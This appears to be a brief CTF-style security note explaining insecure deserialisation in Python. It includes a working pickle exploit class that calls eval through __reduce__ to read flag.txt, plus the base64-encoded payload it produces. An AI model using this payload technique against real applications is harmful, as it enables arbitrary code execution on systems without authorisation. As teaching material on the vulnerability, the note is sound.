# Insecure Deserialization

Accepting untrusted serialised data without verification leads to code execution.

## Python example

If an application accepts serialised python objects in pickle format and deserialises them without verifyinf the integrity or authenticity, an attacker can craft a malicious pickle payload:

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        # Return a tuple: (callable, args)
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Generate and encode the payload
payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```
```python
# script output (base64):
gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
```

Entering the payload into a vulnerable application results in arbitrary code execution.